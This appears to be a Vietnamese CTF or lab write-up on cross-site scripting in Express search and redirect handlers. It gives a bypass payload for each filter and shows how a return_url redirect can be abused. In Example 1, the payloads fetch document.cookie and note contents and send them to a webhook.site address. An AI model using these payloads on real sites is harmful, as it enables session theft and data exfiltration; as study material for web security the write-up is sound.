### Example 1

```
router.get('/search', function (req, res, next) {
    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
    res.send(html);
});
```
thay thế req.query.q = <h1>test</h1> để kiểm tra xem trang web có xử lý tag html không. Từ đó, kết luận lỗ hổng xss:

Khai thác: `<script>alert(1)</script>`

Gửi document.cookie đến webhook: `<script>fetch('https://webhook.site/eed00e3b-780c-4e08-a013-3636f4d0acec?' + document.cookie </script>`

<script>fetch("/note").then(function(response){ return response.text()}).then(function(string){ fetch('https://webhook.site/[uniqueid]?note='+encodeURI(string)) });</script>

### Example 2

```
router.get('/search', function (req, res, next) {
    // Sử dụng regex để replace <script> tag
    // Flag g: dùng để match tất cả ký tự trong mẫu tìm kiếm
    // Flag i: case insensitve không phân biệt chữ hoa chữ thường
    sanitized_q = req.query.q.replace(/<script>|<\/script>/gi, "");
    html = 'Your search - <b>' + sanitized_q + '</b> - did not match any notes.<br><br>'
    res.send(html);
});
```

Filter <script> và <\script>. Nhưng chỉ lọc 1 lần và chỉ thay đổi <script>-->"" hoặc </script>-->"". Vì vậy khai thác:

`<scr<script>ipt>alert(1)</scr</script>ipt>`

### Example 3

```
router.get('/search', function (req, res, next) {
    // Don't allow script keyword
    if (req.query.q.search(/script/i) > 0) {
        res.send('Hack detected');
        return;
    }
    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
    res.send(html);
});
```

Lần này không thay <script> thì null nữa mà ban luôn =))))). Tìm tag khác có thể thay thế <script>.

Khai thác: `<img src=xss onerror = alert(1) >`

### Example 4

HttpOnly là 1 Set-cookie header nằm trong gói HTTP response. Mục đích chính của của httpOnly là bảo vệ cookie khỏi việc truy cập trái phép từ browsers.

### Example 5

EJS Template (Embedded JavaScript Template)

```
function redirect() {
            var url = new URL(window.location);
            var return_url = url.searchParams.get("return_url");
            window.location = return_url;
        }
```

Hàm redirect() trong đoạn mã này thực hiện chuyển hướng trang đến một URL được lấy từ tham số return_url của URL hiện tại. Cụ thể:
- var url = new URL(window.location); tạo một đối tượng URL dựa trên URL hiện tại của trang, cho phép dễ dàng thao tác với các phần khác nhau của URL (như tham số truy vấn, đường dẫn, domain, v.v.).
- var return_url = url.searchParams.get("return_url"); lấy giá trị của tham số truy vấn return_url từ URL hiện tại. Nếu return_url không tồn tại trong URL, return_url sẽ là null.
- window.location = return_url; điều hướng (chuyển hướng) trang đến return_url.

Những nơi có thể kích hoạt javascript:

![image](https://github.com/user-attachments/assets/9df84440-ce8a-4b17-9b24-afbdbabe8cbf)

Khai thác: return_url=javascript:alert(origin)





